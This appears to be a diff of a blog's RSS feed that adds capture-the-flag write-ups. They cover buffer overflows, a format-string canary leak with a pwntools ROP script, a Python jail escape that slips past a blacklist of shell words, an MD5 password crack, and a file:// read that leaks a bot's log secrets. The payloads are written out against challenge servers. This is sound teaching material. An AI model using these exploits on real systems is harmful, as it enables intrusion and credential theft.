@@ -1,19 +1,62 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
     <channel>
         <title>Posts on Hello Friend</title>
-        <link>https://CTF-Writeups.github.io/posts/</link>
+        <link>https://github.com/Lucassass/CTF-Writeups.github.io/posts/</link>
         <description>Recent content in Posts on Hello Friend</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Thu, 11 Mar 2021 00:00:00 +0000</lastBuildDate>
-        <atom:link href="https://CTF-Writeups.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        <lastBuildDate>Fri, 29 Oct 2021 00:00:00 +0000</lastBuildDate>
+        <atom:link href="https://github.com/Lucassass/CTF-Writeups.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Killer-Queen CTF: A Kind Of Magic</title>
+            <link>https://github.com/Lucassass/CTF-Writeups.github.io/posts/akindofmagic/</link>
+            <pubDate>Fri, 29 Oct 2021 00:00:00 +0000</pubDate>
+            
+            <guid>https://github.com/Lucassass/CTF-Writeups.github.io/posts/akindofmagic/</guid>
+            <description>A Kind Of Magic We get a binary, which asks us for a magic input and outputs &amp;ldquo;Your magic is&amp;rdquo;, followed by a number. This is 0 unless the input is fairly large. We can test the length and find that the output is 0 until we write the 40th character - then it will always be 10.
+That it is 10 is interesting, since this is the ASCII value of a newline - so it could seem like we fill a buffer with 44 characters and the next character is printed back, which will then always be a newline.</description>
+            <content type="html"><![CDATA[<h1 id="a-kind-of-magic">A Kind Of Magic</h1>
+<p>We get a binary, which asks us for a magic input and outputs &ldquo;Your magic is&rdquo;, followed by a number. This is 0 unless the input is fairly large. We can test the length and find that the output is 0 until we write the 40th character - then it will always be 10.</p>
+<p>That it is 10 is interesting, since this is the ASCII value of a newline - so it could seem like we fill a buffer with 44 characters and the next character is printed back, which will then always be a newline.</p>
+<p>Looking into the code in Cutter and decompiling, it looks fairly simple:</p>
+<pre tabindex="0"><code class="language-clike=" data-lang="clike=">main(int argc, char **argv)
+{
+    char **var_40h;
+    int var_34h;
+    char *s;
+    unsigned long var_4h;
+
+    var_4h = 0;
+    puts(&quot;Is this a kind of magic? What is your magic?: &quot;);
+    fflush(_stdout);
+    fgets(&amp;s, 0x40, _stdin);
+    printf(&quot;You entered %s\n&quot;, &amp;s);
+    printf(&quot;Your magic is: %d\n&quot;, var_4h);
+    fflush(_stdout);
+    if (var_4h == 0x539) {
+        puts(&quot;Whoa we got a magic man here!&quot;);
+        fflush(_stdout);
+        system(&quot;cat flag.txt&quot;);
+    } else {
+        puts(&quot;You need to challenge the doors of time&quot;);
+        fflush(_stdout);
+    }
+    return 0;
+}
+</code></pre><p>It initializes a string <code>char* s</code> and a value <code>var_4h = 0</code>. It then takes an input up to 64 characters and assigns to the string. But perhaps the buffer for the string is not as large (44 characters according to our test). This means the next characters overflow into <code>var_4h</code>, which is then printed. So we can basically insert any number we want into <code>var_4h</code>.</p>
+<p>This is very useful, since the next condition checks if <code>var_4h == 0x539</code> and if so, we get the flag.</p>
+<p>So we can simply pass in 44 random bytes followed by 0x539 (followed by some null bytes to get the newline out of the integer and into the next field):</p>
+<pre tabindex="0"><code>python2 -c &quot;print b'A' * 44 + b'\x39\x05\x00\x00'&quot; | nc 143.198.184.186 5000
+</code></pre>]]></content>
+        </item>
         
         <item>
             <title>Killer-Queen CTF: Broke College Students</title>
-            <link>https://CTF-Writeups.github.io/posts/brokecollegestudents/</link>
-            <pubDate>Thu, 11 Mar 2021 00:00:00 +0000</pubDate>
+            <link>https://github.com/Lucassass/CTF-Writeups.github.io/posts/brokecollegestudents/</link>
+            <pubDate>Fri, 29 Oct 2021 00:00:00 +0000</pubDate>
             
-            <guid>https://CTF-Writeups.github.io/posts/brokecollegestudents/</guid>
+            <guid>https://github.com/Lucassass/CTF-Writeups.github.io/posts/brokecollegestudents/</guid>
             <description>Broke College Students Basic idea: Format string attack in two steps. Step 1: leak an address, find the same offset with objdump, add offset of MONEY &amp;ndash; result is real address of MONEY in memory, which we want to override. Step 2: Use format string to write 999999 characters followed by %n, allowing us to place that value in an address we specify afterwards &amp;ndash; so we specify the MONEY address to get that amount of money.</description>
             <content type="html"><![CDATA[<h1 id="broke-college-students">Broke College Students</h1>
 <p>Basic idea:
@@ -52,6 +95,400 @@ send_string(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34
 
 p<span style="color:#f92672">.</span>interactive()
 </code></pre></div>]]></content>
+        </item>
+        
+        <item>
+            <title>Killer-Queen CTF: I Want To Break Free</title>
+            <link>https://github.com/Lucassass/CTF-Writeups.github.io/posts/iwanttobreakfree/</link>
+            <pubDate>Fri, 29 Oct 2021 00:00:00 +0000</pubDate>
+            
+            <guid>https://github.com/Lucassass/CTF-Writeups.github.io/posts/iwanttobreakfree/</guid>
+            <description>I Want To Break Free We are given a Python file which asks us whether we can escape from jail and prompts us for an input. This input is run directly in an exec() call &amp;ndash; except if it is found to be unsafe. It is unsafe in the following two cases:
+ One of the characters are outside the ASCII range, 33-126  This includes space, which is therefore not allowed   A word from the provided blacklist is part of the input  The blacklist contains:</description>
+            <content type="html"><![CDATA[<h1 id="i-want-to-break-free">I Want To Break Free</h1>
+<p>We are given a Python file which asks us whether we can escape from jail and prompts us for an input. This input is run directly in an <code>exec()</code> call &ndash; except if it is found to be unsafe. It is unsafe in the following two cases:</p>
+<ul>
+<li>One of the characters are outside the ASCII range, 33-126
+<ul>
+<li>This includes space, which is therefore not allowed</li>
+</ul>
+</li>
+<li>A word from the provided blacklist is part of the input</li>
+</ul>
+<p>The blacklist contains:</p>
+<pre tabindex="0"><code>cat
+grep
+nano
+import
+eval
+subprocess
+input
+sys
+execfile
+builtins
+open
+dict
+exec
+for
+dir
+file
+input
+write
+while
+echo
+print
+int
+os
+</code></pre><p>What we typically want in these sorts of challenges is to execute code in the server shell, so we can read out the flag. We do this by trying to get access to <code>os.system()</code>. If we have access to <code>__builtins__</code>, then we can run commands by using e.g.</p>
+<pre><code>__builtins__.__import__('os').system('ls')
+</code></pre>
+<p>We have a few issues here. <code>import</code>, <code>os</code>, and <code>system</code> are all blacklisted. We can easily get around the <code>os</code> problem by just splitting the string in two and using string concatenation:</p>
+<pre><code>__builtins__.__import__('o''s').system('ls')
+</code></pre>
+<p>To get around the <code>import</code> and <code>system</code> problems, we can &ndash; instead of using dot notation &ndash; get the elements from e.g. <code>__builtins__</code> as a dictionary by using <code>__builtins__.__dict__</code> and then access what we want as a key instead:</p>
+<pre><code>__builtins__.__dict__['__import__']('o''s').__dict__['system']('ls')
+</code></pre>
+<p>And now that we access them as a string, we can use the same string splitting to get around the blacklist. This lets us execute <code>ls</code> on the server to find the flag:</p>
+<pre><code>__builtins__.__dict__['__imp''ort__']('o''s').__dict__['sy''stem']('ls')
+</code></pre>
+<p>and we get</p>
+<pre tabindex="0"><code>bin
+blacklist.txt
+boot
+cf7728be7980fd770ce03d9d937d6d4087310f02db7fcba6ebbad38bd641ba19.txt
+dev
+etc
+home
+jail.py
+lib
+lib32
+lib64
+libx32
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+</code></pre><p>The flag is very likely to be in the file with the long hex name, so we want to run <code>cat</code> on this - we can just use <code>cat c*.txt</code> to shorten the command, as this is the only txt file starting with <code>c</code>. We run into other issues here - first, the <code>cat</code> command is blacklisted, so we must split it up. And secondly we are using our first space, which is not allowed. Since we use it in a string, the easy fix is to just use another encoding of it, e.g. <code>\x20</code> in hex (or something else in binary or octal). This will be used as a space, but there is no longer a space in the actual input:</p>
+<pre><code>__builtins__.__dict__['__imp''ort__']('o''s').__dict__['sy''stem']('ca''t\x20c*.txt')
+</code></pre>
+<p>Inputting this, we get the flag.</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Killer-Queen CTF: Obligatory Shark</title>
+            <link>https://github.com/Lucassass/CTF-Writeups.github.io/posts/obligatoryshark/</link>
+            <pubDate>Fri, 29 Oct 2021 00:00:00 +0000</pubDate>
+            
+            <guid>https://github.com/Lucassass/CTF-Writeups.github.io/posts/obligatoryshark/</guid>
+            <description>Obligatory Shark We are given a wireshark file upon opening the file in Wireshark, we see a single Telnet stream. We right-click and Follow TCP Stream and see a user logging in with username user2 and password 33a465747cb15e84a26564f57cda0988. After testing that the password just wasn&amp;rsquo;t the flag we thought that it is likely just an simple hash like MD5, which we can crack with
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 which immediately spits out the password dancingqueen.</description>
+            <content type="html"><![CDATA[<h1 id="obligatory-shark">Obligatory Shark</h1>
+<p>We are given a wireshark file upon opening the file in Wireshark, we see a single Telnet stream.
+We right-click and Follow TCP Stream and see a user logging in with username <code>user2</code> and password <code>33a465747cb15e84a26564f57cda0988</code>. After testing that the password just wasn&rsquo;t the flag we thought that it is likely just an simple hash like MD5, which we can crack with</p>
+<pre tabindex="0"><code>john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5
+</code></pre><p>which immediately spits out the password <code>dancingqueen</code>. Wrapped in the flag format, this is the correct flag.</p>
+<p>Funny site node the hint which was given later in the CTF to people was good
+Hint: youtube link:<a href="https://www.youtube.com/watch?v=-tJYN-eG1zk">Queen - We Will Rock You</a></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Killer-Queen CTF: She&#39;s A Killed Queen</title>
+            <link>https://github.com/Lucassass/CTF-Writeups.github.io/posts/sheisakilledqueen/</link>
+            <pubDate>Fri, 29 Oct 2021 00:00:00 +0000</pubDate>
+            
+            <guid>https://github.com/Lucassass/CTF-Writeups.github.io/posts/sheisakilledqueen/</guid>
+            <description>She&amp;rsquo;s A Killed Queen We are given a corrupted PNG image. Expecting it, we find that width and height have both been set to 0. The CRC code therefore isn&amp;rsquo;t correct.
+Fixing the CRC code doesn&amp;rsquo;t help, since the image is still set as a 0x0 one. What we instead need to do is find the heigth and width values that will make the provided CRC code correct.
+We can fairly quickly bruteforce our way through this.</description>
+            <content type="html"><![CDATA[<h1 id="shes-a-killed-queen">She&rsquo;s A Killed Queen</h1>
+<p>We are given a corrupted PNG image. Expecting it, we find that width and height have both been set to 0. The CRC code therefore isn&rsquo;t correct.</p>
+<p>Fixing the CRC code doesn&rsquo;t help, since the image is still set as a 0x0 one. What we instead need to do is find the heigth and width values that will make the provided CRC code correct.</p>
+<p>We can fairly quickly bruteforce our way through this. We extract the IHDR info and write a script that tries inserting every possible width and height, compute the CRC and check if it matches. We try just up to 2000 for both width and height:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">2000</span>):
+    <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">2000</span>):
+        width <span style="color:#f92672">=</span> i<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">4</span>, byteorder<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;big&#39;</span>)
+        height <span style="color:#f92672">=</span> j<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">4</span>, byteorder<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;big&#39;</span>)
+        a <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x49\x48\x44\x52</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> width <span style="color:#f92672">+</span> height <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x08\x06\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>
+        crc_code <span style="color:#f92672">=</span> crc(a)
+        <span style="color:#66d9ef">if</span> crc_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0DB3F6C0</span>:
+            print(width, height)
+            exit()
+</code></pre></div><p>where we use the following code to compute the CRC:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">crc_table <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">make_crc_table</span>():
+  <span style="color:#66d9ef">global</span> crc_table
+  crc_table <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">256</span>
+  <span style="color:#66d9ef">for</span> n <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>):
+    c <span style="color:#f92672">=</span> n
+    <span style="color:#66d9ef">for</span> k <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
+        <span style="color:#66d9ef">if</span> c <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>:
+            c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xedb88320</span> <span style="color:#f92672">^</span> (c <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">1</span>)
+        <span style="color:#66d9ef">else</span>:
+            c <span style="color:#f92672">=</span> c <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">1</span>
+    crc_table[n] <span style="color:#f92672">=</span> c
+
+make_crc_table()
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">update_crc</span>(crc, buf):
+  c <span style="color:#f92672">=</span> crc
+  <span style="color:#66d9ef">for</span> byte <span style="color:#f92672">in</span> buf:
+    c <span style="color:#f92672">=</span> crc_table[int((c <span style="color:#f92672">^</span> byte) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>)] <span style="color:#f92672">^</span> (c <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">8</span>)
+  <span style="color:#66d9ef">return</span> c
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">crc</span>(buf):
+  <span style="color:#66d9ef">return</span> update_crc(<span style="color:#ae81ff">0xffffffff</span>, buf) <span style="color:#f92672">^</span> <span style="color:#ae81ff">0xffffffff</span>
+</code></pre></div><p>We quickly get the output <code>b'\x00\x00\x04\xb0' b'\x00\x00\x02\xa3'</code> and we can insert those as the width and height in the image using <code>hexedit</code>.</p>
+<p>The image is now repaired and can be opened. It just shows a painting of a queen:
+<img src="https://i.imgur.com/rW91umj.png" alt="Queen">
+Opening the image in <code>stegsolve</code>, we look through the different channels and planes. In all three RGB channels, plane 0 hides another image in the least significant bit:
+<img src="https://i.imgur.com/5DqcFqv.png" alt="Cipher">
+Googling a bit, we find this to be the &ldquo;Mary Stuart Code&rdquo;, used by the Mary Queen of Scots, which can be decrypted here:
+<a href="https://www.dcode.fr/mary-stuart-code">https://www.dcode.fr/mary-stuart-code</a>
+Typing in each character, we convert to ASCII and get the flag:</p>
+<blockquote>
+<p>kqctf{SHES_A_KILLED_QUEEN_BY_THE_GUILLOTINE_RANDOMCHRSIADHFKILIHASDKFHQIFPXKRL}</p>
+</blockquote>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Killer-Queen CTF: Tweety Birb</title>
+            <link>https://github.com/Lucassass/CTF-Writeups.github.io/posts/tweetybird/</link>
+            <pubDate>Fri, 29 Oct 2021 00:00:00 +0000</pubDate>
+            
+            <guid>https://github.com/Lucassass/CTF-Writeups.github.io/posts/tweetybird/</guid>
+            <description>Tweety Birb We are given a binary with the following main function
+int main(void) { char buffer [72]; long canary = *(long *)(in_FS_OFFSET + 0x28); puts(&amp;quot;What are these errors the compiler is giving me about gets and printf? Whatever, I have this little tweety birb protectinig me so it\&#39;s not like you hacker can do anything. Anyways, what do you think of magpies?&amp;quot;); gets(buffer); printf(buffer); puts(&amp;quot;\nhmmm interesting. What about water fowl?</description>
+            <content type="html"><![CDATA[<h1 id="tweety-birb">Tweety Birb</h1>
+<p>We are given a binary with the following main function</p>
+<pre tabindex="0"><code class="language-clike" data-lang="clike">int main(void) {
+    char buffer [72];
+    long canary = *(long *)(in_FS_OFFSET + 0x28);
+
+    puts(&quot;What are these errors the compiler is giving me about gets and printf? Whatever, I have this little tweety birb protectinig me so it\'s not like you hacker can do anything. Anyways, what do you think of magpies?&quot;);
+    gets(buffer);
+    printf(buffer);
+
+    puts(&quot;\nhmmm interesting. What about water fowl?&quot;);
+    gets(buffer);
+
+    if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
+        __stack_chk_fail();
+    }
+    return 0;
+}
+</code></pre><p>We have a buffer of size 72. First, we have a call to <code>gets</code>, allowing us to write anything, including more than 72 characters, so we have a buffer overflow.</p>
+<p>We also have a <code>win</code> function elsewhere which calls <code>cat flag.txt</code> in a shell, so we want to return to this by overwriting RSP. The problem here (which the title hints at) is that canaries are enabled. This means a random value is set up in the beginning of <code>main</code> right after the other local variables. At the end of <code>main</code> it checks if this canary has been modified, and if so crashes.</p>
+<p>So the second we write more than 72 bytes to the buffer, we modify the canary, which results in a crash. What we want to modify lies after the canary.</p>
+<p>The only way to get around this is by somehow leaking the canary. If we can do this, we can write 72 bytes of padding, followed by the canary and then what we want to place in RBP and RSP.</p>
+<p>Luckily we ALSO have a format string vulnerability, since <code>printf(buffer)</code> is called directly on our input, allowing us to pass any format string. Since no other arguments are passed, if we input e.g. <code>%x</code>, the value that it prints will just be the next on the stack.</p>
+<p>The canary also lies on the stack and by using <code>gdb</code> to debug the program, we can get the correct index in the stack, in this case 15. This means that if we pass <code>%15$p</code> to the first <code>gets()</code>, then the stack canary is leaked in the <code>printf()</code>.</p>
+<p>We find the address of the <code>win</code> function with <code>objdump -d tweetybirb | grep win</code>, which returns <code>00000000004011d6 &lt;win&gt;:</code>. Now we can create the following payload:</p>
+<ul>
+<li>72 bytes of padding</li>
+<li>leaked canary</li>
+<li>rbp (8 random bytes)</li>
+<li>rsp (0x4011d6)</li>
+</ul>
+<p>We also need to remember to align the stack when run remotely, so we find a <code>ret</code> gadget with <code>ropper -f tweetybird</code> at address 0x4011d6 and add this before the <code>win</code> address.</p>
+<p>We get the flag with the following script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;143.198.184.186&#34;</span>, <span style="color:#ae81ff">5002</span>)
+
+<span style="color:#75715e"># LEAK CANARY IN</span>
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%15$p&#34;</span>)
+
+canary <span style="color:#f92672">=</span> p64(int(p<span style="color:#f92672">.</span>recvline()[<span style="color:#ae81ff">2</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>], <span style="color:#ae81ff">16</span>))
+log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Canary leaked: </span><span style="color:#e6db74">{</span>canary<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+
+<span style="color:#75715e"># BUFFER OVERFLOW</span>
+padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">72</span>
+rbp <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>
+ret <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x40101a</span>)
+win_addr <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x4011d6</span>)
+
+payload <span style="color:#f92672">=</span> padding <span style="color:#f92672">+</span> canary <span style="color:#f92672">+</span> rbp <span style="color:#f92672">+</span> ret <span style="color:#f92672">+</span> win_addr
+p<span style="color:#f92672">.</span>sendline(payload)
+
+p<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p>The flag returned is</p>
+<blockquote>
+<p>kqctf{tweet<em>tweet_did_you_leak_or_bruteforce</em>&hellip;_plz_dont_say_you_tried_bruteforce}</p>
+</blockquote>
+]]></content>
+        </item>
+        
+        <item>
+            <title>BuckEye: Pay2win</title>
+            <link>https://github.com/Lucassass/CTF-Writeups.github.io/posts/pay2win/</link>
+            <pubDate>Sat, 23 Oct 2021 00:00:00 +0000</pubDate>
+            
+            <guid>https://github.com/Lucassass/CTF-Writeups.github.io/posts/pay2win/</guid>
+            <description>Pay2win Opening the URL, we immediately get loads of popups. It detects if we try to open devtools and redirects to a rick roll clip.
+We can disable JS in the browser to avoid the popups, allowing us to open devtools. Inspecting the source, we find main.js, which among others contain the function
+function plantFlag () { const ciphertext = [234, 240, 234, 252, 214, 236, 140, 247, 173, 191, 158, 132, 56, 4, 32, 73, 235, 193, 233, 152, 125, 19, 19, 237, 186, 131, 98, 52, 186, 143, 127, 43, 226, 233, 126, 15, 225, 171, 85, 55, 173, 123, 21, 147, 97, 21, 237, 11, 254, 129, 2, 131, 101, 63, 149, 61] const plaintext = ciphertext.</description>
+            <content type="html"><![CDATA[<h1 id="pay2win">Pay2win</h1>
+<p>Opening the URL, we immediately get loads of popups. It detects if we try to open devtools and redirects to a rick roll clip.</p>
+<p>We can disable JS in the browser to avoid the popups, allowing us to open devtools. Inspecting the source, we find <code>main.js</code>, which among others contain the function</p>
+<pre tabindex="0"><code class="language-javascript=" data-lang="javascript=">function plantFlag () {
+  const ciphertext = [234, 240, 234, 252, 214, 236, 140, 247, 173, 191, 158, 132, 56, 4, 32, 73, 235, 193, 233, 152, 125, 19, 19, 237, 186, 131, 98, 52, 186, 143, 127, 43, 226, 233, 126, 15, 225, 171, 85, 55, 173, 123, 21, 147, 97, 21, 237, 11, 254, 129, 2, 131, 101, 63, 149, 61]
+  const plaintext = ciphertext.map((x, i) =&gt; ((i * i) % 256) ^ x ^ 0x99)
+
+  const flagElement = document.querySelector('#flag')
+  plaintext.map((x, i) =&gt; {
+    const span = document.createElement('span')
+    span.classList.add(`flag-char-${i}`)
+    span.textContent = String.fromCharCode(x)
+    flagElement.appendChild(span)
+    return span
+  })
+
+  const flagOverlay = document.querySelector('#flag-overlay')
+  flagOverlay.addEventListener('mouseover', async () =&gt; {
+    await swal(flagAlert)
+  })
+}
+</code></pre><p>Running just the first two lines, we get a list of numbers within ASCII range. We can convert it to a string with</p>
+<pre tabindex="0"><code class="language-javascript=" data-lang="javascript=">plaintet.map(x =&gt; String.fromCharCode(x)).join(&quot;&quot;)
+</code></pre><p>but this gives us</p>
+<blockquote>
+<p>shwl_l1_twcd14}1ry4ht3neck_t3_bs{1c_hkh_tsh3he03gy_3l_hu</p>
+</blockquote>
+<p>which looks like a scrambled flag with the right characters. The rest of <code>plantFlag()</code> inserts the plaintext in the element with id <code>flag</code>. This field is overlayed, so it&rsquo;s not immediately visible. The script then adds a listener to create a paywall popup when the overlay is moused over (assuming JS is enabled). But we can just remove the overlay in devtools, allowing us to see the flag:</p>
+<blockquote>
+<p>buckeye{h0ly_sh1t_wh4t_th3_h3ck_1s_th1s_w31rd_ch4ll3ng3}</p>
+</blockquote>
+<p>Why was the order of the characters different on the page? Because each character was in its own <code>&lt;span&gt;</code> element with its own id, and each had a different flex-order, swapping them into their correct spots.</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>BuckEye: Stegbot</title>
+            <link>https://github.com/Lucassass/CTF-Writeups.github.io/posts/stegbot/</link>
+            <pubDate>Sat, 23 Oct 2021 00:00:00 +0000</pubDate>
+            
+            <guid>https://github.com/Lucassass/CTF-Writeups.github.io/posts/stegbot/</guid>
+            <description>Stegbot Description: Everybody loves steghide, so I made StegBot#2632 so that you can use it from Discord! Make sure to join our Discord server if you haven&amp;rsquo;t already, and DM /info to StegBot to get started.
+Steghide: https://github.com/perfectblue/ctf-writeups/tree/master/2020/csaw-quals-2020/take-it-easy#step-3 Discord server: https://discord.gg/WyUcFqrDjP Stegbot source code: https://github.com/qxxxb/StegBot (from writing /info to the bot)
+Solution The flag is stored in an environment variable called &amp;ldquo;FLAG&amp;rdquo;
+The flag is embedded in bof.jpg at the bottom of the source code (happens once every time the bot restarts):</description>
+            <content type="html"><![CDATA[<h1 id="stegbot">Stegbot</h1>
+<h2 id="description">Description:</h2>
+<p>Everybody loves steghide, so I made StegBot#2632 so that you can use it from Discord! Make sure to join our Discord server if you haven&rsquo;t already, and DM /info to StegBot to get started.</p>
+<p>Steghide: <a href="https://github.com/perfectblue/ctf-writeups/tree/master/2020/csaw-quals-2020/take-it-easy#step-3">https://github.com/perfectblue/ctf-writeups/tree/master/2020/csaw-quals-2020/take-it-easy#step-3</a>
+Discord server: <a href="https://discord.gg/WyUcFqrDjP">https://discord.gg/WyUcFqrDjP</a>
+Stegbot source code: <a href="https://github.com/qxxxb/StegBot">https://github.com/qxxxb/StegBot</a> (from writing /info to the bot)</p>
+<h2 id="solution">Solution</h2>
+<p>The flag is stored in an environment variable called &ldquo;FLAG&rdquo;</p>
+<p>The flag is embedded in bof.jpg at the bottom of the source code (happens once every time the bot restarts):</p>
+<pre tabindex="0"><code class="language-typescript=" data-lang="typescript=">stegEmbed('bof.jpg', FLAG, randomString())
+</code></pre><p>If we can get a hold of this output image and the password used to embed the flag, we can use the bot&rsquo;s /extract command to get the flag</p>
+<p>Having a closer look at the stegEmbed function, we can see that the output path and the stegHide password are both logged:</p>
+<pre tabindex="0"><code class="language-typescript=" data-lang="typescript=">logger.info({ imagePath, outputPath, password })
+</code></pre><p>The log file is located at ./app.log:</p>
+<pre tabindex="0"><code class="language-typescript=" data-lang="typescript=">const logger = pino(pino.destination('app.log'))
+</code></pre><p>Curl allows getting local files with the syntax <code>curl file://&lt;path&gt;</code></p>
+<p>Looking at the source code, we can use the /embed bot command without a message to return an arbitrary file:</p>
+<pre tabindex="0"><code class="language-typescript=" data-lang="typescript=">async function commandEmbed (interaction: CommandInteraction) {
+  const imageURL = interaction.options.getString('image_url')!
+  const imagePath = path.join(TMP_DIR, `${randomString()}.jpg`)
+  downloadFile(imageURL, imagePath)
+
+  const message = interaction.options.getString('message')
+  const password = interaction.options.getString('password')
+
+  if (!message) {
+    await interaction.reply({
+      content: &quot;No message provided, so here's the blank image&quot;,
+      files: [imagePath],
+      ephemeral: true
+    })
+    return
+  }
+</code></pre><p>Looking at the jail.cfg file in the source code, we see that the app directory is mounted at /app inside the docker virtual machine</p>
+<p>Now we can try to get a hold of the log file with the /embed command:
+<code>/embed image_url:file:///app/app.log</code>
+&hellip;
+Success!
+<img src="https://i.imgur.com/GWqmFH5.png" alt=""></p>
+<p>Opening this file in <code>less</code>, we can see that the first entry has the following info:</p>
+<pre tabindex="0"><code>{&quot;level&quot;:30,&quot;time&quot;:1634959870125,&quot;pid&quot;:1,&quot;hostname&quot;:&quot;NSJAIL&quot;,&quot;imagePath&quot;:&quot;bof.jpg&quot;,&quot;outputPath&quot;:&quot;/tmp/images/a7fba042185aa216aaf2f87763b65724.jpg&quot;,&quot;password&quot;:&quot;e3cde4ceae826098ba87716de396e028&quot;}
+</code></pre><p>Now we can use the /extract command with the info from the log:
+<code>/extract image_url:file:///tmp/images/7fba042185aa216aaf2f87763b65724.jpg password: e3cde4ceae826098ba87716de396e028</code></p>
+<p>And then we get the flag:
+<img src="https://i.imgur.com/AaVQSaa.png" alt=""></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>CSAW: Password_checker</title>
+            <link>https://github.com/Lucassass/CTF-Writeups.github.io/posts/password_checker/</link>
+            <pubDate>Fri, 10 Sep 2021 00:00:00 +0000</pubDate>
+            
+            <guid>https://github.com/Lucassass/CTF-Writeups.github.io/posts/password_checker/</guid>
+            <description>Password_Checker: Intro: Charlie forgot his password to login into his Office portal. Help him to find it. (This challenge was written for the person on your team who has never solved a binary exploitation challenge before! Welcome to pwning.)
+Netcat:nc pwn.chal.csaw.io 5000
+File: password_checker
+Go through The first hint you get is that this is for someone who hasn&amp;rsquo;t solved a binary exploit before therefore we know a good place too look is at the file which we recieved.</description>
+            <content type="html"><![CDATA[<h1 id="password_checker">Password_Checker:</h1>
+<h2 id="intro">Intro:</h2>
+<p>Charlie forgot his password to login into his Office portal. Help him to find it. (This challenge was written for the person on your team who has never solved a binary exploitation challenge before! Welcome to pwning.)</p>
+<p>Netcat:nc pwn.chal.csaw.io 5000</p>
+<p>File: password_checker</p>
+<h2 id="go-through">Go through</h2>
+<p>The first hint you get is that this is for someone who hasn&rsquo;t solved a binary exploit before therefore we know a good place too look is at the file which we recieved. You can therefore start by using a tool to check the file for information about it I used GDB</p>
+<p>So, in terminal run:<code>gdb password_checker</code></p>
+<p>Here you get the info</p>
+<pre tabindex="0"><code>adding symbols from password_checker...
+I'm sorry, Dave, I can't do that.  Symbol format ´elf64-x86-64´ unknown.
+</code></pre><p>So from this we learn that the file is of the elf64-x86-64 format. elf is Executable and Linkable Format 64 bit</p>
+<p>Now that we now it is a executable we can try using the tool checksec, when we run checksec on the binary:</p>
+<p><code>checksec --file=password_checker</code></p>
+<p>Then we get the information that there is no canary found, nx is enabled, no PIE, no RPATH</p>
+<p>So here we learn that nx is enabled the NX bit (no-execute) is a technology used in CPUs to segregate areas of memory for use by either storage of processor instructions (code) or for storage of data.</p>
